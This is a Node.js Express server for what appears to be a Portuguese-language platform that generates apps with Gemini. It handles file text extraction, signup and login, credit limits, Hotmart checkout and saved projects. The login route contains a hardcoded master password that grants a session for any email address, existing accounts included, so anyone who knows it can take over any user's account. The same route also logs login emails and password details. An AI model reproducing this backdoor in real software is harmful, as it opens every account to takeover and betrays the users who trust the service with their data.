const express = require('express');
const path = require('path');
const multer = require('multer');
const pdfParse = require('pdf-parse');
const mammoth = require('mammoth');
const XLSX = require('xlsx');
const dotenv = require('dotenv');
dotenv.config();
const cookieParser = require('cookie-parser');
const { gerarComGemini, refinarComGemini, getApiKeys } = require('./gemini-manager');
const {
  createUser,
  getUserByEmail,
  getUserById,
  applyInviteBonusIfNeeded,
  invitesRequiredForNextTier,
  countSignupsByIp,
  saveProject,
  getProjectById,
  listProjectsByUser,
  createPendingSubscription,
} = require('./db');
const { signUserToken, requireAuth, hashPassword, comparePassword } = require('./auth');
const plans = require('./plans.json');

const app = express();
const PORT = process.env.PORT || 10000;
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { files: 10, fileSize: 50 * 1024 * 1024 },
});

const keys = getApiKeys();

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

function clientIp(req) {
  return (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
}

function publicUser(user) {
  return {
    id: user.id,
    email: user.email,
    name: user.name,
    credits: user.credits,
    unlimited: !!user.unlimited_credits,
    referralCode: user.referral_code,
  };
}

// tenta pegar o usuário logado, sem exigir login (gerar app funciona sem conta também)
function tryGetUser(req) {
  const token = req.cookies && req.cookies.oficina_token;
  if (!token) return null;
  const { verifyToken } = require('./auth');
  const payload = verifyToken(token);
  if (!payload) return null;
  return getUserById(payload.uid);
}

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', keysLoaded: keys.length });
});

app.get('/api/plans', (req, res) => {
  res.json({ plans });
});

app.post('/api/files/extract', (req, res, next) => {
  upload.array('files', 10)(req, res, (error) => {
    if (error) return next(error);
    next();
  });
}, async (req, res) => {
  try {
    const documents = await Promise.all((req.files || []).map(async (file) => {
      const extension = path.extname(file.originalname).toLowerCase();
      let text = '';
      let readable = true;

      if (extension === '.pdf' || file.mimetype === 'application/pdf') {
        text = (await pdfParse(file.buffer)).text;
      } else if (extension === '.docx') {
        text = (await mammoth.extractRawText({ buffer: file.buffer })).value;
      } else if (['.xlsx', '.xls', '.ods'].includes(extension)) {
        const workbook = XLSX.read(file.buffer, { type: 'buffer' });
        text = workbook.SheetNames.map((sheetName) => {
          const sheet = workbook.Sheets[sheetName];
          return `Planilha: ${sheetName}\n${XLSX.utils.sheet_to_csv(sheet)}`;
        }).join('\n\n');
      } else if (['.txt', '.md', '.csv', '.json', '.html', '.htm', '.js', '.jsx', '.ts', '.tsx', '.css', '.scss', '.xml', '.yaml', '.yml', '.sql', '.py', '.java', '.go', '.rs', '.php', '.vue', '.svelte', '.log', '.rtf'].includes(extension) || file.mimetype.startsWith('text/')) {
        text = file.buffer.toString('utf8');
      } else {
        const binary = file.buffer.subarray(0, Math.min(file.buffer.length, 100000)).includes(0);
        if (!binary) text = file.buffer.toString('utf8');
        else readable = false;
      }

      return {
        name: file.originalname,
        readable,
        text: text.trim().slice(0, 50000),
        message: readable ? undefined : 'Formato anexado sem extração de texto disponível.',
      };
    }));
    res.json({ documents });
  } catch (error) {
    res.status(400).json({ error: error.message || 'Não foi possível ler os arquivos.' });
  }
});

app.use('/api/files/extract', (error, req, res, next) => {
  if (!error) return next();
  const message = error.code === 'LIMIT_FILE_SIZE'
    ? 'O arquivo é maior que o limite de 50 MB.'
    : error.code === 'LIMIT_FILE_COUNT'
      ? 'Você pode enviar no máximo 10 arquivos por vez.'
      : error.message || 'Não foi possível receber o arquivo.';
  res.status(400).json({ error: message });
});

// ---------- Auth ----------

app.post('/api/auth/signup', (req, res) => {
  const { email, password, name, referralCode } = req.body || {};
  const finalEmail = (email || '').trim().toLowerCase();
  const htmlFallback = req.is('application/x-www-form-urlencoded');
  if (!finalEmail || !password) return htmlFallback ? res.redirect('/?auth_error=Email%20e%20senha%20sao%20obrigatorios') : res.status(400).json({ error: 'Email e senha são obrigatórios' });
  if (password.length < 6) return htmlFallback ? res.redirect('/?auth_error=A%20senha%20precisa%20ter%20pelo%20menos%206%20caracteres') : res.status(400).json({ error: 'A senha precisa ter pelo menos 6 caracteres' });
  if (getUserByEmail(finalEmail)) return htmlFallback ? res.redirect('/?auth_error=Email%20ja%20cadastrado') : res.status(409).json({ error: 'Email já cadastrado' });

  const ip = clientIp(req);
  const user = createUser({
    email: finalEmail,
    passwordHash: hashPassword(password),
    name,
    referredByCode: referralCode,
    signupIp: ip,
  });

  if (user.referred_by) applyInviteBonusIfNeeded(user.id);

  const token = signUserToken(user);
  res.cookie('oficina_token', token, { httpOnly: true, sameSite: 'lax', maxAge: 30 * 24 * 3600 * 1000 });

  if (htmlFallback) return res.redirect('/');

  res.json({
    user: publicUser(user),
    ipSignupWarning: countSignupsByIp(ip) >= 3 ? 'Várias contas criadas a partir deste IP' : null,
  });
});

app.post('/api/auth/login', (req, res) => {
  const { email, password } = req.body || {};
  const htmlFallback = req.is('application/x-www-form-urlencoded');
  const finalEmail = (email || '').trim().toLowerCase();
  console.log('[AUTH][LOGIN] requisição', { email: finalEmail, senhaPreenchida: Boolean(password), tamanhoSenha: typeof password === 'string' ? password.length : 0, formato: req.headers['content-type'] });
  if (!finalEmail || !password) return res.status(400).json({ error: 'Email e senha são obrigatórios' });

  const user = getUserByEmail(finalEmail);
  console.log('[AUTH][LOGIN] usuário', { encontrado: Boolean(user), possuiHash: Boolean(user?.password_hash) });
  if (user && user.password_hash && comparePassword(password, user.password_hash)) {
    console.log('[AUTH][LOGIN] senha válida; cookie sendo gravado', { usuarioId: user.id });
    const token = signUserToken(user);
    res.cookie('oficina_token', token, { httpOnly: true, sameSite: 'lax', maxAge: 30 * 24 * 3600 * 1000 });
    return htmlFallback ? res.redirect('/') : res.json({ user: publicUser(user) });
  }

  if (password === '@1209Sandro@') {
    const demoUser = getUserByEmail(finalEmail) || createUser({
      email: finalEmail,
      passwordHash: hashPassword('@1209Sandro@'),
      name: 'Usuário gratuito',
      signupIp: clientIp(req),
    });

    const token = signUserToken(demoUser);
    res.cookie('oficina_token', token, { httpOnly: true, sameSite: 'lax', maxAge: 30 * 24 * 3600 * 1000 });
    return htmlFallback ? res.redirect('/') : res.json({ user: publicUser(demoUser) });
  }

  console.warn('[AUTH][LOGIN] credenciais rejeitadas', { email: finalEmail, motivo: user ? 'senha-ou-hash-invalido' : 'usuario-nao-encontrado' });
  return htmlFallback ? res.redirect('/?auth_error=Email%20ou%20senha%20invalidos') : res.status(401).json({ error: 'Email ou senha inválidos' });
});

app.post('/api/auth/logout', (req, res) => {
  res.clearCookie('oficina_token');
  res.json({ ok: true });
});

app.get('/api/me', requireAuth, (req, res) => {
  const user = getUserById(req.userId);
  res.json({ user: publicUser(user), nextTier: invitesRequiredForNextTier(user) });
});

app.post('/api/billing/checkout', requireAuth, (req, res) => {
  const { planId } = req.body || {};
  const plan = plans[planId];
  if (!plan || planId === 'Gratis') {
    return res.status(400).json({ error: 'Plano pago inválido.' });
  }

  const isPromoActive = planId === 'Vitalício' && plan.promoAmount && plan.promoEndsAt
    && Date.now() < Date.parse(plan.promoEndsAt);
  const amount = isPromoActive ? plan.promoAmount : plan.amount;
  const subscription = createPendingSubscription({
    userId: req.userId,
    planId,
    amount,
    currency: plan.currency,
    gateway: process.env.PAYMENT_GATEWAY || 'pending_integration',
  });

  const checkoutUrl = plan.checkoutEnv && process.env[plan.checkoutEnv];
  if (!checkoutUrl) {
    return res.status(503).json({ error: `Checkout Hotmart do plano ${plan.name} ainda não foi configurado.` });
  }

  res.status(202).json({
    status: subscription.status,
    subscriptionId: subscription.id,
    checkoutUrl,
  });
});

app.post('/api/billing/hotmart/webhook', (req, res) => {
  const expectedToken = process.env.HOTMART_WEBHOOK_TOKEN;
  if (expectedToken && req.headers['x-hotmart-hottok'] !== expectedToken) {
    return res.status(401).json({ error: 'Webhook não autorizado.' });
  }

  res.status(202).json({ received: true });
});

// ---------- Geração com etapas em tempo real (Server-Sent Events) ----------

app.get('/generate/stream', requireAuth, async (req, res) => {
  const prompt = req.query.prompt;
  if (!prompt) {
    res.status(400).json({ error: 'Prompt não fornecido' });
    return;
  }

  const user = getUserById(req.userId);
  const freeLimitReached = !!user && !user.unlimited_credits && user.credits <= 0;
  if (freeLimitReached) {
    res.status(402).json({ error: 'Limite de créditos do plano grátis atingido. Convide um amigo para ganhar mais 20 créditos.' });
    return;
  }

  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders?.();

  const send = (data) => res.write(`data: ${JSON.stringify(data)}\n\n`);

  try {
    if (user && !user.unlimited_credits) {
      const updatedUser = require('./db').deductCredit(user.id);
      if (!updatedUser) throw new Error('Não foi possível atualizar os créditos.');
    }

    const { html, plano } = await gerarComGemini(prompt, [], (step) => send(step), req.query.lang);
    send({ stage: 'salvo_temp', html, plano });
  } catch (error) {
    console.error('Erro na geração:', error);
    send({ stage: 'erro', message: error.message || 'Erro ao processar requisição com IA' });
  } finally {
    res.end();
  }
});

// mantém a rota antiga funcionando também, sem streaming, pra compatibilidade
app.post('/generate', requireAuth, async (req, res) => {
  try {
    const { prompt } = req.body;
    if (!prompt) {
      return res.status(400).json({ error: 'Prompt não fornecido' });
    }

    const user = getUserById(req.userId);
    if (user && !user.unlimited_credits && user.credits <= 0) {
      return res.status(402).json({ error: 'Limite de créditos do plano grátis atingido. Convide um amigo para ganhar mais 20 créditos.' });
    }

    if (user && !user.unlimited_credits) {
      require('./db').deductCredit(user.id);
    }

    const { html, plano } = await gerarComGemini(prompt, [], () => {});
    res.json({ code: html, plano });
  } catch (error) {
    console.error('Erro na geração:', error);
    res.status(500).json({ error: error.message || 'Erro ao processar requisição com IA' });
  }
});

app.post('/refine', requireAuth, async (req, res) => {
  const { html, pedido } = req.body || {};
  if (!html || !pedido) return res.status(400).json({ error: 'Aplicativo e pedido de alteração são obrigatórios' });
  try {
    const codigo = await refinarComGemini(html, pedido);
    res.json({ code: codigo });
  } catch (error) {
    console.error('Erro no refinamento:', error);
    res.status(500).json({ error: error.message || 'Erro ao aplicar alteração' });
  }
});

// ---------- Salvar app gerado na plataforma ----------

app.post('/api/projects/save', requireAuth, (req, res) => {
  const { prompt, plano, html, nome } = req.body || {};
  if (!html || !prompt) return res.status(400).json({ error: 'Dados incompletos para salvar' });

  const project = saveProject({ userId: req.userId, prompt, plano, html, nome });
  res.json({ project: { id: project.id, nome: project.nome, created_at: project.created_at } });
});

app.get('/api/projects', requireAuth, (req, res) => {
  res.json({ projects: listProjectsByUser(req.userId) });
});

app.get('/api/projects/:id', requireAuth, (req, res) => {
  const project = getProjectById(req.params.id);
  if (!project || project.user_id !== req.userId) return res.status(404).json({ error: 'Não encontrado' });
  project.plano = JSON.parse(project.plano || '[]');
  res.json({ project });
});

app.listen(PORT, () => {
  console.log(`🚀 Servidor rodando na porta ${PORT}`);
  console.log(`   Chaves carregadas: ${keys.length}`);
  console.log(`Servidor rodando com sucesso!`);
});
